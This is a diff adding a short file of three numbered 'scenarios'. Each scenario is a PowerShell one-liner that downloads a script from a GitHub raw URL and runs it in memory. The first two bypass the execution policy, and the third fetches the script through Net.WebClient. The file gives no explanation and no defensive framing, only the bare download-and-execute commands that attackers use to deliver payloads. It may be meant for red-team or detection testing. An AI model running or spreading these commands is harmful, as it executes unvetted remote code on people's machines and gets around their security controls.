@@ -1,0 +1,6 @@
+Scenario 1:
+powershell -NoP -Exec Bypass -C "iex (irm 'https://raw.githubusercontent.com/Justanother-engineer/scenario1/main/loader.ps1')"
+Scenario 2:
+powershell -NoP -Exec Bypass -C "iex (irm 'https://raw.githubusercontent.com/Justanother-engineer/scenario2/main/loader.ps2')"
+Scenario 3: 
+iex([Text.Encoding]::UTF8.GetString((New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/Justanother-engineer/scenario3/main/cleanup.ps1')))  
